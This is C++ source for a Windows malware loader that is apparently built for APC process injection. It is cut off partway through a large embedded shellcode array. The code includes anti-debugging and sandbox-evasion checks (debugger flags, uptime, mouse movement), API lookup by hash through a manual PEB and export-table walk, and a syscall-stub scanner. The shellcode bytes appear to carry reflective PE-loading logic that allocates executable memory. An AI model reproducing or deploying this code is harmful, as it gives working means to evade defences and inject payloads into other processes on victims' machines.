#include "header.h"

// process injection with apc
//// 1. find process                                                    ////
//// 2. Open the target process                                         ////
//// 3. allocate memory on the remote process                          ////
//// 5. write the shellcode                                             ////
//// 6. Create suspended thread                                        ////
//// 7. queue the APC to execute the shellcode in the remote thread     ////

// for antidebug
BOOL AntiDebugAndSandboxCheck(PPEB ppeb) {

    // degugger detection
    if (ppeb->BeingDebugged != 0) {
        printf("[-] Debugger detected! lets do some math ...\n");
        return 1;
    }

    // also a debugger detection
    if (IsDebuggerPresent()) {
        printf("[-] Debugger detected via IsDebuggerPresent\n");
        return FALSE;
    }

    // same
    BOOL debugger = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debugger);
    if (debugger) {
        printf("[-] Debugger detected by CheckRemoteDebuggerPresent\n");
        return FALSE;
    }

    // Check system uptime
    if (GetTickCount64() < 5000) {
        printf("[-] System uptime too low, likely sandbox\n");
        return FALSE;
    }

    // Check for mouse movement
    POINT p1 = { 0 }, p2 = { 0 };
    GetCursorPos(&p1);
    Sleep(5000);
    GetCursorPos(&p2);

    if (p1.x == p2.x && p1.y == p2.y) {
        printf("[-] Mouse hasn\'t moved => sandbox ?\n");
        return FALSE;
    }

    return TRUE;
}

//void xor3000functionfullturingcompletedelamuerte(BYTE* data, SIZE_T size, BYTE key) {
//    for (SIZE_T i = 0; i < size; ++i) {
//        data[i] ^= key;
//    }
//}
//void print_shellcode_hex(const BYTE* data, SIZE_T size) {
//    for (SIZE_T i = 0; i < size; ++i) {
//        printf("0x%02X", data[i]);
//        if (i < size - 1) printf(", ");
//
//        // Print 5 per line
//        if ((i + 1) % 5 == 0) printf("\n");
//    }
//    if (size % 5 != 0) printf("\n");
//}


// compile time hash with constexpr
constexpr DWORD64 hashB(const char* chaine) {
    DWORD64 constante = 0xA28;
    int c = 0;

    while (c = *chaine++)
        constante = (constante << 5) + constante + c;

    return constante;
}

wchar_t* my_wcsrchr(const wchar_t* str, wchar_t ch) {
    const wchar_t* last = NULL;

    while (*str != L'\0') {
        if (*str == ch) {
            last = str;
        }
        str++;
    }

    if (ch == L'\0') {
        return (wchar_t*)str;
    }

    return (wchar_t*)last;
}

LPWSTR get_dll_name(PLDR_DATA_TABLE_ENTRY liste_flink) {

    PWCHAR ddl_name = liste_flink->FullDllName.Buffer;
    PWSTR dll = my_wcsrchr(ddl_name, '\\') + 1;
    return dll;
}

PVOID get_func(DWORD64 func_hashed) {

    // get the PEB
    PPEB ppeb = (PPEB)__readgsqword(0x60);

    // get the list which contains our loaded modules in the memory
    PLDR_DATA_TABLE_ENTRY liste_flink = (PLDR_DATA_TABLE_ENTRY)((PBYTE)ppeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);

    // get the DLL name
    LPWSTR dll_name = get_dll_name(liste_flink);

    // base address of the DLL load in memory
    PDWORD base_addr = (PDWORD)liste_flink->DllBase;

    // Header DOS of the image of the DLL
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)base_addr;
    PIMAGE_NT_HEADERS64 pe_header = (PIMAGE_NT_HEADERS64)((DWORD64)base_addr + dos_header->e_lfanew);

    // Adresse virtuelle du répertoire d'exportation
    ULONG offset_virtual_addresse = pe_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY export_directory = (PIMAGE_EXPORT_DIRECTORY)((DWORD64)offset_virtual_addresse + (DWORD64)base_addr);

    PDWORD adr_name = (PDWORD)((DWORD64)export_directory->AddressOfNames + (DWORD64)base_addr);
    PDWORD adr_func = (PDWORD)((DWORD64)export_directory->AddressOfFunctions + (DWORD64)base_addr);
    PWORD adr_ordinal = (PWORD)((DWORD64)export_directory->AddressOfNameOrdinals + (DWORD64)base_addr);

    // run on our number of function
    for (DWORD i = 0; i < export_directory->NumberOfFunctions; i++) {

        DWORD_PTR adr_name_ = (DWORD64)adr_name[i] + (DWORD64)base_addr;

        // compare the hash calculated of our function and the hash of the function of the dll
        if (func_hashed == hashB((char*)adr_name_)) {
            // be could use the name
            return (PVOID)((DWORD64)base_addr + adr_func[adr_ordinal[i]]);
        }
    }
    return 0;
}


// get PID of a process by its name
DWORD FindProcessId(const std::wstring& processName)
{
    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32First(snapshot, &processEntry)) {
        do {
            if (!_wcsicmp(processEntry.szExeFile, processName.c_str())) {
                CloseHandle(snapshot);
                return processEntry.th32ProcessID;
            }
        } while (Process32Next(snapshot, &processEntry));
    }

    CloseHandle(snapshot);
    return 0; // Not found
}

DWORD FindThreadId(DWORD pid) {
    THREADENTRY32 threadEntry;
    threadEntry.dwSize = sizeof(THREADENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    if (Thread32First(snapshot, &threadEntry)) {
        do {
            if (threadEntry.th32OwnerProcessID == pid) {
                CloseHandle(snapshot);
                return threadEntry.th32ThreadID;
            }
        } while (Thread32Next(snapshot, &threadEntry));
    }

    CloseHandle(snapshot);
    return 0;
}

// from here https://github.com/0xkylm/shitty-loader/blob/main/Shitty-loader/Shitty-loader.cpp#L42
BYTE* FindSyscallAddr(DWORD64 hash) {

    PVOID func = (PVOID)get_func(hash);

    BYTE* func_base = (BYTE*)(func);
    BYTE* temp_base = 0x00;
    //0x0F + 0x05 = syscall
    // 0xc3 = ret
    while (*func_base != 0xc3) {
        temp_base = func_base;
        if (*temp_base == 0x0f) {
            temp_base++;
            if (*temp_base == 0x05) {
                temp_base++;
                if (*temp_base == 0xc3) {
                    temp_base = func_base;
                    break;
                }
            }
        }
        else {
            func_base++;
            temp_base = 0x00;
        }
    }
    return func_base;
}

int main() {

    // get the PEB
    PPEB ppeb = (PPEB)__readgsqword(0x60);

    if (!AntiDebugAndSandboxCheck(ppeb)) return 1;


    unsigned char shellcode[] = {
    0xcc, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x40,
    0x18, 0x48, 0x8b, 0x40, 0x20, 0x48, 0x8b, 0x00, 0x48, 0x8b, 0x00, 0x48,
    0x8b, 0x40, 0x20, 0xc3, 0x48, 0x81, 0xec, 0xa8, 0x00, 0x00, 0x00, 0x66,
    0x44, 0x0f, 0x7f, 0xbc, 0x24, 0x90, 0x00, 0x00, 0x00, 0x66, 0x44, 0x0f,
    0x7f, 0xb4, 0x24, 0x80, 0x00, 0x00, 0x00, 0x66, 0x44, 0x0f, 0x7f, 0x6c,
    0x24, 0x70, 0x66, 0x44, 0x0f, 0x7f, 0x64, 0x24, 0x60, 0x66, 0x44, 0x0f,
    0x7f, 0x5c, 0x24, 0x50, 0x66, 0x44, 0x0f, 0x7f, 0x54, 0x24, 0x40, 0x66,
    0x44, 0x0f, 0x7f, 0x4c, 0x24, 0x30, 0x66, 0x44, 0x0f, 0x7f, 0x44, 0x24,
    0x20, 0x66, 0x0f, 0x7f, 0x7c, 0x24, 0x10, 0x66, 0x0f, 0x7f, 0x34, 0x24,
    0x48, 0x89, 0xc8, 0x4d, 0x85, 0xc0, 0x0f, 0x84, 0x4c, 0x05, 0x00, 0x00,
    0x49, 0x8d, 0x48, 0x0f, 0x48, 0x83, 0xe1, 0xf0, 0x49, 0xff, 0xc8, 0x66,
    0x49, 0x0f, 0x6e, 0xc0, 0x66, 0x0f, 0x70, 0xc0, 0x44, 0x45, 0x31, 0xc0,
    0x66, 0x0f, 0x6f, 0x1d, 0xa8, 0x0c, 0x00, 0x00, 0x66, 0x0f, 0x6f, 0x25,
    0xb0, 0x0c, 0x00, 0x00, 0x66, 0x0f, 0x6f, 0x2d, 0xb8, 0x0c, 0x00, 0x00,
    0x66, 0x0f, 0x6f, 0x35, 0xc0, 0x0c, 0x00, 0x00, 0x66, 0x0f, 0x6f, 0x3d,
    0xc8, 0x0c, 0x00, 0x00, 0x66, 0x44, 0x0f, 0x6f, 0x05, 0xcf, 0x0c, 0x00,
    0x00, 0x66, 0x44, 0x0f, 0x6f, 0x0d, 0xd6, 0x0c, 0x00, 0x00, 0x66, 0x45,
    0x0f, 0x76, 0xd2, 0x66, 0x4d, 0x0f, 0x6e, 0xd8, 0x66, 0x45, 0x0f, 0x70,
    0xdb, 0x44, 0x66, 0x45, 0x0f, 0x6f, 0xeb, 0x66, 0x45, 0x0f, 0xeb, 0xe8,
    0x66, 0x44, 0x0f, 0x6f, 0xe0, 0x66, 0x45, 0x0f, 0xef, 0xe1, 0x66, 0x45,
    0x0f, 0xef, 0xe9, 0x66, 0x45, 0x0f, 0x6f, 0xfd, 0x66, 0x45, 0x0f, 0x66,
    0xfc, 0x66, 0x45, 0x0f, 0x70, 0xf7, 0xa0, 0xf2, 0x41, 0x0f, 0x70, 0xce,
    0xe8, 0x66, 0x45, 0x0f, 0x76, 0xec, 0x66, 0x45, 0x0f, 0x70, 0xed, 0xf5,
    0xf2, 0x41, 0x0f, 0x70, 0xd5, 0xe8, 0x66, 0x0f, 0xdb, 0xd1, 0x66, 0x45,
    0x0f, 0x70, 0xff, 0xf5, 0xf2, 0x41, 0x0f, 0x70, 0xcf, 0xe8, 0x66, 0x0f,
    0xeb, 0xca, 0x66, 0x41, 0x0f, 0xef, 0xca, 0x66, 0x0f, 0x6b, 0xc9, 0x66,
    0x41, 0x0f, 0x7e, 0xc9, 0x41, 0xf6, 0xc1, 0x01, 0x74, 0x04, 0x42, 0x88,
    0x14, 0x00, 0x66, 0x45, 0x0f, 0xdb, 0xee, 0x66, 0x45, 0x0f, 0xeb, 0xef,
    0x66, 0x45, 0x0f, 0x6b, 0xed, 0x66, 0x45, 0x0f, 0xef, 0xea, 0x66, 0x45,
    0x0f, 0x6b, 0xed, 0x66, 0x45, 0x0f, 0x63, 0xed, 0x66, 0x45, 0x0f, 0x7e,
    0xe9, 0x41, 0xc1, 0xe9, 0x08, 0x41, 0xf6, 0xc1, 0x01, 0x74, 0x05, 0x42,
    0x88, 0x54, 0x00, 0x01, 0x66, 0x41, 0x0f, 0x6f, 0xcb, 0x66, 0x0f, 0xeb,
    0xcf, 0x66, 0x41, 0x0f, 0xef, 0xc9, 0x66, 0x0f, 0x6f, 0xd1, 0x66, 0x41,
    0x0f, 0x66, 0xd4, 0x66, 0x44, 0x0f, 0x70, 0xea, 0xa0, 0x66, 0x41, 0x0f,
    0x76, 0xcc, 0x66, 0x44, 0x0f, 0x70, 0xf1, 0xf5, 0x66, 0x41, 0x0f, 0x6f,
    0xce, 0x66, 0x41, 0x0f, 0xdb, 0xcd, 0x66, 0x44, 0x0f, 0x70, 0xfa, 0xf5,
    0x66, 0x41, 0x0f, 0xeb, 0xcf, 0x66, 0x0f, 0x6b, 0xc9, 0x66, 0x41, 0x0f,
    0xef, 0xca, 0x66, 0x0f, 0x6b, 0xc9, 0x66, 0x0f, 0x63, 0xc9, 0x66, 0x41,
    0x0f, 0x7e, 0xc9, 0x41, 0xc1, 0xe9, 0x10, 0x41, 0xf6, 0xc1, 0x01, 0x74,
    0x05, 0x42, 0x88, 0x54, 0x00, 0x02, 0xf3, 0x41, 0x0f, 0x70, 0xcd, 0x84,
    0xf3, 0x41, 0x0f, 0x70, 0xd6, 0x84, 0x66, 0x0f, 0xdb, 0xd1, 0xf3, 0x41,
    0x0f, 0x70, 0xcf, 0x84, 0x66, 0x0f, 0xeb, 0xca, 0x66, 0x41, 0x0f, 0xef,
    0xca, 0x66, 0x0f, 0x6b, 0xc9, 0x66, 0x0f, 0x63, 0xc9, 0x66, 0x41, 0x0f,
    0x7e, 0xc9, 0x41, 0xc1, 0xe9, 0x18, 0x41, 0xf6, 0xc1, 0x01, 0x74, 0x05,
    0x42, 0x88, 0x54, 0x00, 0x03, 0x66, 0x41, 0x0f, 0x6f, 0xcb, 0x66, 0x0f,
    0xeb, 0xce, 0x66, 0x41, 0x0f, 0xef, 0xc9, 0x66, 0x0f, 0x6f, 0xd1, 0x66,
    0x41, 0x0f, 0x66, 0xd4, 0x66, 0x44, 0x0f, 0x70, 0xf2, 0xa0, 0xf2, 0x45,
    0x0f, 0x70, 0xfe, 0xe8, 0x66, 0x41, 0x0f, 0x76, 0xcc, 0x66, 0x44, 0x0f,
    0x70, 0xe9, 0xf5, 0xf2, 0x41, 0x0f, 0x70, 0xcd, 0xe8, 0x66, 0x41, 0x0f,
    0xdb, 0xcf, 0x66, 0x44, 0x0f, 0x70, 0xfa, 0xf5, 0xf2, 0x41, 0x0f, 0x70,
    0xd7, 0xe8, 0x66, 0x0f, 0xeb, 0xd1, 0x66, 0x41, 0x0f, 0xef, 0xd2, 0x66,
    0x0f, 0x6b, 0xca, 0x66, 0x0f, 0x63, 0xc9, 0x66, 0x44, 0x0f, 0xc5, 0xc9,
    0x02, 0x41, 0xf6, 0xc1, 0x01, 0x74, 0x05, 0x42, 0x88, 0x54, 0x00, 0x04,
    0x66, 0x45, 0x0f, 0xdb, 0xee, 0x66, 0x45, 0x0f, 0xeb, 0xef, 0x66, 0x45,
    0x0f, 0x6b, 0xed, 0x66, 0x45, 0x0f, 0xef, 0xea, 0x66, 0x41, 0x0f, 0x6b,
    0xcd, 0x66, 0x0f, 0x63, 0xc9, 0x66, 0x44, 0x0f, 0xc5, 0xc9, 0x02, 0x41,
    0xc1, 0xe9, 0x08, 0x41, 0xf6, 0xc1, 0x01, 0x74, 0x05, 0x42, 0x88, 0x54,
    0x00, 0x05, 0x66, 0x41, 0x0f, 0x6f, 0xcb, 0x66, 0x0f, 0xeb, 0xcd, 0x66,
    0x41, 0x0f, 0xef, 0xc9, 0x66, 0x0f, 0x6f, 0xd1, 0x66, 0x41, 0x0f, 0x66,
    0xd4, 0x66, 0x44, 0x0f, 0x70, 0xea, 0xa0, 0x66, 0x41, 0x0f, 0x76, 0xcc,
    0x66, 0x44, 0x0f, 0x70, 0xf1, 0xf5, 0x66, 0x41, 0x0f, 0x6f, 0xce, 0x66,
    0x41, 0x0f, 0xdb, 0xcd, 0x66, 0x44, 0x0f, 0x70, 0xfa, 0xf5, 0x66, 0x41,
    0x0f, 0xeb, 0xcf, 0x66, 0x0f, 0x6b, 0xc9, 0x66, 0x41, 0x0f, 0xef, 0xca,
    0x66, 0x0f, 0x6b, 0xc9, 0x66, 0x0f, 0x63, 0xc9, 0x66, 0x44, 0x0f, 0xc5,
    0xc9, 0x03, 0x41, 0xf6, 0xc1, 0x01, 0x74, 0x05, 0x42, 0x88, 0x54, 0x00,
    0x06, 0xf3, 0x41, 0x0f, 0x70, 0xcd, 0x84, 0xf3, 0x41, 0x0f, 0x70, 0xd6,
    0x84, 0x66, 0x0f, 0xdb, 0xd1, 0xf3, 0x41, 0x0f, 0x70, 0xcf, 0x84, 0x66,
    0x0f, 0xeb, 0xca, 0x66, 0x41, 0x0f, 0xef, 0xca, 0x66, 0x0f, 0x6b, 0xc9,
    0x66, 0x0f, 0x63, 0xc9, 0x66, 0x44, 0x0f, 0xc5, 0xc9, 0x03, 0x41, 0xc1,
    0xe9, 0x08, 0x41, 0xf6, 0xc1, 0x01, 0x74, 0x05, 0x42, 0x88, 0x54, 0x00,
    0x07, 0x66, 0x41, 0x0f, 0x6f, 0xcb, 0x66, 0x0f, 0xeb, 0xcc, 0x66, 0x41,
    0x0f, 0xef, 0xc9, 0x66, 0x0f, 0x6f, 0xd1, 0x66, 0x41, 0x0f, 0x66, 0xd4,
    0x66, 0x44, 0x0f, 0x70, 0xf2, 0xa0, 0xf2, 0x45, 0x0f, 0x70, 0xfe, 0xe8,
    0x66, 0x41, 0x0f, 0x76, 0xcc, 0x66, 0x44, 0x0f, 0x70, 0xe9, 0xf5, 0xf2,
    0x41, 0x0f, 0x70, 0xcd, 0xe8, 0x66, 0x41, 0x0f, 0xdb, 0xcf, 0x66, 0x44,
    0x0f, 0x70, 0xfa, 0xf5, 0xf2, 0x41, 0x0f, 0x70, 0xd7, 0xe8, 0x66, 0x0f,
    0xeb, 0xd1, 0x66, 0x41, 0x0f, 0xef, 0xd2, 0x66, 0x0f, 0x6b, 0xd2, 0x66,
    0x0f, 0x63, 0xca, 0x66, 0x44, 0x0f, 0xc5, 0xc9, 0x04, 0x41, 0xf6, 0xc1,
    0x01, 0x74, 0x05, 0x42, 0x88, 0x54, 0x00, 0x08, 0x66, 0x45, 0x0f, 0xdb,
    0xee, 0x66, 0x45, 0x0f, 0xeb, 0xef, 0x66, 0x45, 0x0f, 0x6b, 0xed, 0x66,
    0x45, 0x0f, 0xef, 0xea, 0x66, 0x45, 0x0f, 0x6b, 0xed, 0x66, 0x41, 0x0f,
    0x63, 0xcd, 0x66, 0x44, 0x0f, 0xc5, 0xc9, 0x04, 0x41, 0xc1, 0xe9, 0x08,
    0x41, 0xf6, 0xc1, 0x01, 0x74, 0x05, 0x42, 0x88, 0x54, 0x00, 0x09, 0x66,
    0x41, 0x0f, 0x6f, 0xcb, 0x66, 0x0f, 0xeb, 0xcb, 0x66, 0x41, 0x0f, 0xef,
    0xc9, 0x66, 0x0f, 0x6f, 0xd1, 0x66, 0x41, 0x0f, 0x66, 0xd4, 0x66, 0x44,
    0x0f, 0x70, 0xea, 0xa0, 0x66, 0x41, 0x0f, 0x76, 0xcc, 0x66, 0x44, 0x0f,
    0x70, 0xf1, 0xf5, 0x66, 0x41, 0x0f, 0x6f, 0xce, 0x66, 0x41, 0x0f, 0xdb,
    0xcd, 0x66, 0x44, 0x0f, 0x70, 0xfa, 0xf5, 0x66, 0x41, 0x0f, 0xeb, 0xcf,
    0x66, 0x0f, 0x6b, 0xc9, 0x66, 0x41, 0x0f, 0xef, 0xca, 0x66, 0x0f, 0x6b,
    0xc9, 0x66, 0x0f, 0x63, 0xc9, 0x66, 0x44, 0x0f, 0xc5, 0xc9, 0x05, 0x41,
    0xf6, 0xc1, 0x01, 0x74, 0x05, 0x42, 0x88, 0x54, 0x00, 0x0a, 0xf3, 0x41,
    0x0f, 0x70, 0xcd, 0x84, 0xf3, 0x41, 0x0f, 0x70, 0xd6, 0x84, 0x66, 0x0f,
    0xdb, 0xd1, 0xf3, 0x41, 0x0f, 0x70, 0xcf, 0x84, 0x66, 0x0f, 0xeb, 0xca,
    0x66, 0x41, 0x0f, 0xef, 0xca, 0x66, 0x0f, 0x6b, 0xc9, 0x66, 0x0f, 0x63,
    0xc9, 0x66, 0x44, 0x0f, 0xc5, 0xc9, 0x05, 0x41, 0xc1, 0xe9, 0x08, 0x41,
    0xf6, 0xc1, 0x01, 0x74, 0x05, 0x42, 0x88, 0x54, 0x00, 0x0b, 0x66, 0x41,
    0x0f, 0x6f, 0xcb, 0x66, 0x0f, 0xeb, 0x0d, 0xa5, 0x08, 0x00, 0x00, 0x66,
    0x41, 0x0f, 0xef, 0xc9, 0x66, 0x0f, 0x6f, 0xd1, 0x66, 0x41, 0x0f, 0x66,
    0xd4, 0x66, 0x44, 0x0f, 0x70, 0xf2, 0xa0, 0xf2, 0x45, 0x0f, 0x70, 0xfe,
    0xe8, 0x66, 0x41, 0x0f, 0x76, 0xcc, 0x66, 0x44, 0x0f, 0x70, 0xe9, 0xf5,
    0xf2, 0x41, 0x0f, 0x70, 0xcd, 0xe8, 0x66, 0x41, 0x0f, 0xdb, 0xcf, 0x66,
    0x44, 0x0f, 0x70, 0xfa, 0xf5, 0xf2, 0x41, 0x0f, 0x70, 0xd7, 0xe8, 0x66,
    0x0f, 0xeb, 0xd1, 0x66, 0x41, 0x0f, 0xef, 0xd2, 0x66, 0x0f, 0x6b, 0xca,
    0x66, 0x0f, 0x63, 0xc9, 0x66, 0x44, 0x0f, 0xc5, 0xc9, 0x06, 0x41, 0xf6,
    0xc1, 0x01, 0x74, 0x05, 0x42, 0x88, 0x54, 0x00, 0x0c, 0x66, 0x45, 0x0f,
    0xdb, 0xee, 0x66, 0x45, 0x0f, 0xeb, 0xef, 0x66, 0x45, 0x0f, 0x6b, 0xed,
    0x66, 0x45, 0x0f, 0xef, 0xea, 0x66, 0x41, 0x0f, 0x6b, 0xcd, 0x66, 0x0f,
    0x63, 0xc9, 0x66, 0x44, 0x0f, 0xc5, 0xc9, 0x06, 0x41, 0xc1, 0xe9, 0x08,
    0x41, 0xf6, 0xc1, 0x01, 0x74, 0x05, 0x42, 0x88, 0x54, 0x00, 0x0d, 0x66,
    0x44, 0x0f, 0xeb, 0x1d, 0xfc, 0x07, 0x00, 0x00, 0x66, 0x45, 0x0f, 0xef,
    0xd9, 0x66, 0x41, 0x0f, 0x6f, 0xcb, 0x66, 0x41, 0x0f, 0x66, 0xcc, 0x66,
    0x44, 0x0f, 0x70, 0xe9, 0xa0, 0x66, 0x45, 0x0f, 0x76, 0xdc, 0x66, 0x45,
    0x0f, 0x70, 0xdb, 0xf5, 0x66, 0x41, 0x0f, 0x6f, 0xd3, 0x66, 0x41, 0x0f,
    0xdb, 0xd5, 0x66, 0x44, 0x0f, 0x70, 0xe1, 0xf5, 0x66, 0x41, 0x0f, 0xeb,
    0xd4, 0x66, 0x0f, 0x6b, 0xca, 0x66, 0x41, 0x0f, 0xef, 0xca, 0x66, 0x0f,
    0x6b, 0xc9, 0x66, 0x0f, 0x63, 0xc9, 0x66, 0x44, 0x0f, 0xc5, 0xc9, 0x07,
    0x41, 0xf6, 0xc1, 0x01, 0x74, 0x05, 0x42, 0x88, 0x54, 0x00, 0x0e, 0xf3,
    0x41, 0x0f, 0x70, 0xcd, 0x84, 0xf3, 0x41, 0x0f, 0x70, 0xd3, 0x84, 0x66,
    0x0f, 0xdb, 0xd1, 0xf3, 0x41, 0x0f, 0x70, 0xcc, 0x84, 0x66, 0x0f, 0xeb,
    0xca, 0x66, 0x41, 0x0f, 0xef, 0xca, 0x66, 0x0f, 0x6b, 0xc9, 0x66, 0x0f,
    0x63, 0xc9, 0x66, 0x44, 0x0f, 0xc5, 0xc9, 0x07, 0x41, 0xc1, 0xe9, 0x08,
    0x41, 0xf6, 0xc1, 0x01, 0x74, 0x05, 0x42, 0x88, 0x54, 0x00, 0x0f, 0x49,
    0x83, 0xc0, 0x10, 0x4c, 0x39, 0xc1, 0x0f, 0x85, 0x0b, 0xfb, 0xff, 0xff,
    0x0f, 0x10, 0x34, 0x24, 0x0f, 0x10, 0x7c, 0x24, 0x10, 0x44, 0x0f, 0x10,
    0x44, 0x24, 0x20, 0x44, 0x0f, 0x10, 0x4c, 0x24, 0x30, 0x44, 0x0f, 0x10,
    0x54, 0x24, 0x40, 0x44, 0x0f, 0x10, 0x5c, 0x24, 0x50, 0x44, 0x0f, 0x10,
    0x64, 0x24, 0x60, 0x44, 0x0f, 0x10, 0x6c, 0x24, 0x70, 0x44, 0x0f, 0x10,
    0xb4, 0x24, 0x80, 0x00, 0x00, 0x00, 0x44, 0x0f, 0x10, 0xbc, 0x24, 0x90,
    0x00, 0x00, 0x00, 0x48, 0x81, 0xc4, 0xa8, 0x00, 0x00, 0x00, 0xc3, 0x41,
    0x57, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x56, 0x57, 0x55, 0x53, 0x48,
    0x81, 0xec, 0x28, 0x01, 0x00, 0x00, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x60,
    0x00, 0x00, 0x00, 0x4c, 0x8b, 0x78, 0x18, 0x4d, 0x8b, 0x77, 0x20, 0x49,
    0x83, 0xc7, 0x20, 0x4d, 0x39, 0xfe, 0x0f, 0x84, 0xb0, 0x00, 0x00, 0x00,
    0x48, 0x89, 0xcf, 0x48, 0x8d, 0x5c, 0x24, 0x20, 0xbd, 0xff, 0x00, 0x00,
    0x00, 0x41, 0xbc, 0x3f, 0x00, 0x00, 0x00, 0x4d, 0x8b, 0x6e, 0x40, 0x41,
    0x0f, 0xb7, 0x76, 0x38, 0x41, 0xb8, 0x00, 0x01, 0x00, 0x00, 0x48, 0x89,
    0xd9, 0x31, 0xd2, 0xe8, 0xb4, 0xf9, 0xff, 0xff, 0x66, 0x83, 0xfe, 0x02,
    0x72, 0x28, 0x0f, 0xb7, 0xc6, 0xd1, 0xe8, 0x39, 0xe8, 0x0f, 0x43, 0xc5,
    0x31, 0xc9, 0x41, 0x0f, 0xb7, 0x54, 0x4d, 0x00, 0x81, 0xfa, 0x80, 0x00,
    0x00, 0x00, 0x41, 0x0f, 0x43, 0xd4, 0x88, 0x54, 0x0c, 0x20, 0x48, 0xff,
    0xc1, 0x48, 0x39, 0xc8, 0x75, 0xe4, 0x31, 0xc0, 0x8a, 0x14, 0x07, 0x8a,
    0x4c, 0x04, 0x20, 0x84, 0xd2, 0x74, 0x39, 0x84, 0xc9, 0x74, 0x39, 0x44,
    0x8d, 0x42, 0xbf, 0x44, 0x8d, 0x4a, 0x20, 0x41, 0x80, 0xf8, 0x1a, 0x0f,
    0xb6, 0xd2, 0x45, 0x0f, 0xb6, 0xc1, 0x44, 0x0f, 0x43, 0xc2, 0x8d, 0x51,
    0xbf, 0x44, 0x8d, 0x49, 0x20, 0x80, 0xfa, 0x1a, 0x0f, 0xb6, 0xc9, 0x41,
    0x0f, 0xb6, 0xd1, 0x0f, 0x43, 0xd1, 0x48, 0xff, 0xc0, 0x41, 0x38, 0xd0,
    0x74, 0xbe, 0xeb, 0x04, 0x84, 0xc9, 0x74, 0x22, 0x4d, 0x8b, 0x36, 0x4d,
    0x39, 0xfe, 0x0f, 0x85, 0x63, 0xff, 0xff, 0xff, 0x31, 0xc0, 0x48, 0x81,
    0xc4, 0x28, 0x01, 0x00, 0x00, 0x5b, 0x5d, 0x5f, 0x5e, 0x41, 0x5c, 0x41,
    0x5d, 0x41, 0x5e, 0x41, 0x5f, 0xc3, 0x49, 0x8b, 0x46, 0x10, 0xeb, 0xe6,
    0x56, 0x57, 0x55, 0x53, 0x48, 0x89, 0xc8, 0x8b, 0x49, 0x3c, 0x44, 0x8b,
    0x94, 0x08, 0x88, 0x00, 0x00, 0x00, 0x4d, 0x85, 0xd2, 0x74, 0x5e, 0x42,
    0x8b, 0x4c, 0x10, 0x18, 0x48, 0x85, 0xc9, 0x74, 0x54, 0x46, 0x8b, 0x44,
    0x10, 0x20, 0x46, 0x8b, 0x4c, 0x10, 0x24, 0x46, 0x8b, 0x54, 0x10, 0x1c,
    0x49, 0x01, 0xc0, 0x49, 0x01, 0xc1, 0x49, 0x01, 0xc2, 0x4c, 0x8d, 0x58,
    0x01, 0x31, 0xf6, 0x41, 0x8b, 0x3c, 0xb0, 0x40, 0x8a, 0x2c, 0x38, 0x48,
    0x89, 0xd3, 0x40, 0x84, 0xed, 0x74, 0x19, 0x4c, 0x01, 0xdf, 0x48, 0x89,
    0xd3, 0x40, 0x3a, 0x2b, 0x75, 0x13, 0x48, 0xff, 0xc3, 0x40, 0x8a, 0x2f,
    0x48, 0xff, 0xc7, 0x40, 0x84, 0xed, 0x75, 0xed, 0x80, 0x3b, 0x00, 0x74,
    0x0f, 0x48, 0xff, 0xc6, 0x48, 0x39, 0xce, 0x75, 0xca, 0x31, 0xc0, 0x5b,
    0x5d, 0x5f, 0x5e, 0xc3, 0x41, 0x0f, 0xb7, 0x0c, 0x71, 0x41, 0x8b, 0x0c,
    0x8a, 0x48, 0x01, 0xc8, 0xeb, 0xed, 0x48, 0x89, 0xc8, 0x4d, 0x85, 0xc0,
    0x74, 0x12, 0x31, 0xc9, 0x44, 0x8a, 0x0c, 0x0a, 0x44, 0x88, 0x0c, 0x08,
    0x48, 0xff, 0xc1, 0x49, 0x39, 0xc8, 0x75, 0xf0, 0xc3, 0xc3, 0x41, 0x57,
    0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x56, 0x57, 0x55, 0x53, 0x48, 0x83,
    0xec, 0x38, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48,
    0x8b, 0x40, 0x18, 0x48, 0x8b, 0x40, 0x20, 0x48, 0x8b, 0x00, 0x48, 0x8b,
    0x00, 0x48, 0x8b, 0x70, 0x20, 0x48, 0x85, 0xf6, 0x0f, 0x84, 0x8d, 0x02,
    0x00, 0x00, 0x49, 0x89, 0xcc, 0x48, 0x8d, 0x15, 0x6d, 0x04, 0x00, 0x00,
    0x48, 0x89, 0xf1, 0xe8, 0x14, 0xff, 0xff, 0xff, 0x48, 0x85, 0xc0, 0x0f,
    0x84, 0x72, 0x02, 0x00, 0x00, 0x49, 0x89, 0xc5, 0x48, 0x8d, 0x15, 0x2a,
    0x04, 0x00, 0x00, 0x48, 0x89, 0xf1, 0xe8, 0xf9, 0xfe, 0xff, 0xff, 0x48,
    0x89, 0x44, 0x24, 0x28, 0x48, 0x8d, 0x15, 0x05, 0x04, 0x00, 0x00, 0x48,
    0x89, 0xf1, 0xe8, 0xe5, 0xfe, 0xff, 0xff, 0x49, 0x89, 0xc6, 0x48, 0x8d,
    0x15, 0x13, 0x04, 0x00, 0x00, 0x48, 0x89, 0xf1, 0xe8, 0xd3, 0xfe, 0xff,
    0xff, 0x66, 0x41, 0x81, 0x3c, 0x24, 0x4d, 0x5a, 0x0f, 0x85, 0x2d, 0x02,
    0x00, 0x00, 0x49, 0x63, 0x6c, 0x24, 0x3c, 0x42, 0x81, 0x7c, 0x25, 0x00,
    0x50, 0x45, 0x00, 0x00, 0x0f, 0x85, 0x19, 0x02, 0x00, 0x00, 0x48, 0x89,
    0xc7, 0x4c, 0x01, 0xe5, 0x8b, 0x55, 0x50, 0x48, 0x8b, 0x4d, 0x30, 0x41,
    0xb8, 0x00, 0x30, 0x00, 0x00, 0x41, 0xb9, 0x40, 0x00, 0x00, 0x00, 0x41,
